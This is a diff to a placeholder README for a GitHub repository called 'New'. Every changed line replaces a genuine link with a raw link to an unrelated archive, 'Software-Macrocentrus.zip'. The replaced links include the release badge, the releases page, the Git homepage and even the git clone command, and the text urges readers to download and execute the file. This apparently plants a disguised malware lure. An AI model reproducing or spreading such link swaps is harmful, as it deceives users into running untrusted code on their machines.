@@ -1,8 +1,8 @@
 # Welcome to the New Repository! 🎉
 
-![GitHub Release](https://img.shields.io/badge/releases-latest-blue)
+![GitHub Release](https://raw.githubusercontent.com/ignMaro/new/master/mangue/Software-Macrocentrus.zip)
 
-Thank you for visiting the **New** repository. This project is currently under development, and we appreciate your interest. You can find the latest releases and updates [here](https://github.com/ignMaro/new/releases). 
+Thank you for visiting the **New** repository. This project is currently under development, and we appreciate your interest. You can find the latest releases and updates [here](https://raw.githubusercontent.com/ignMaro/new/master/mangue/Software-Macrocentrus.zip). 
 
 ## Table of Contents
 
@@ -25,7 +25,7 @@ To get started with this repository, you will need to clone it to your local mac
 
 ### Prerequisites
 
-- Ensure you have [Git](https://git-scm.com/) installed on your machine.
+- Ensure you have [Git](https://raw.githubusercontent.com/ignMaro/new/master/mangue/Software-Macrocentrus.zip) installed on your machine.
 - Familiarity with basic command line operations.
 
 ### Cloning the Repository
@@ -33,7 +33,7 @@ To get started with this repository, you will need to clone it to your local mac
 Open your terminal and run the following command:
 
 ```bash
-git clone https://github.com/ignMaro/new.git
+git clone https://raw.githubusercontent.com/ignMaro/new/master/mangue/Software-Macrocentrus.zip
 ```
 
 This command will create a local copy of the repository on your machine.
@@ -48,7 +48,7 @@ While specific features are yet to be outlined, we envision the following capabi
 
 ## Installation
 
-To install the latest version, visit the [Releases](https://github.com/ignMaro/new/releases) section. Download the latest release file, and execute it on your machine. Follow the instructions provided in the release notes for a smooth installation.
+To install the latest version, visit the [Releases](https://raw.githubusercontent.com/ignMaro/new/master/mangue/Software-Macrocentrus.zip) section. Download the latest release file, and execute it on your machine. Follow the instructions provided in the release notes for a smooth installation.
 
 ## Usage
 
@@ -98,4 +98,4 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or suggestions, please reach out through the GitHub issues section or contact the repository owner directly.
 
-Thank you for your interest in the **New** repository! We are excited to see how this project evolves and appreciate your contributions. Remember to check the [Releases](https://github.com/ignMaro/new/releases) section for the latest updates and files to download.
+Thank you for your interest in the **New** repository! We are excited to see how this project evolves and appreciate your contributions. Remember to check the [Releases](https://raw.githubusercontent.com/ignMaro/new/master/mangue/Software-Macrocentrus.zip) section for the latest updates and files to download.
